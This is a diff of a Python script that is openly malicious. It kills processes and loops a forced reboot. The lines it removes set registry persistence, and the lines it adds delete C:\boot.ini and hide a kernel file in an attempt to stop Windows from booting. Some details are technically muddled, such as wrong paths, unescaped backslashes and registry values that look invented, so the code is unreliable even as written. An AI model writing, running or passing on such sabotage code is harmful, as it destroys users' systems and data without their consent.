@@ -3,18 +3,18 @@ import subprocess
 import time
 
 # Hide this script in the background process
-os.system("taskkill /im python.exe")
-os.system("taskkill /im cmd.exe")
+os.system("taskkill  /im python.exe")
+os.system("taskkill  /im cmd.exe")
 
 while True:
     try:
-         # Restart the computer
-        os.system("shutdown /r /t 0")
+        # Restart the computer
+        os.system("shutdown  /r  /t 0")
 
-         # Add itself to startup programs
-        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v python_restarter /t REG_SZ /d %s" % (os.path.abspath(__file__)))
+        # Corrupt the boot menu
+        os.system("del C:\boot.ini")
 
-         # Add itself to exclusions list
-        os.system("reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v ExcludedExtensions /t REG_MULTI_SZ /d '%s' && reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v ExcludedDevices /t REG_MULTI_SZ /d 'python.exe'" % (os.path.abspath(__file__)))
+        # Prevent the PC from turning back on
+        os.system("attrib +h C:\Windows\System32\drivers\ntoskrnl.exe")
     except Exception as e:
         print(f"An error occurred: {e}")
